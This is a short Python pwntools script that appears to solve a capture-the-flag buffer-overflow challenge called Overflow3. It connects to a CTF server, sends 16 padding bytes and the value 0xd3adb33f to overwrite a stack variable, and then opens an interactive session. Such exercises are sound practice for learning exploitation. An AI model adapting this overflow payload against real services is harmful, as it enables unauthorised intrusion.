from pwn import *

local = False
host = 'cyberyoddha.baycyber.net'
port = 10003

if local == True:
	p = process('./Overflow3')
else:
	p = remote(host, port)

payload = b'A'*16
payload += p32(0xd3adb33f)

p.sendline(payload)

p.interactive()
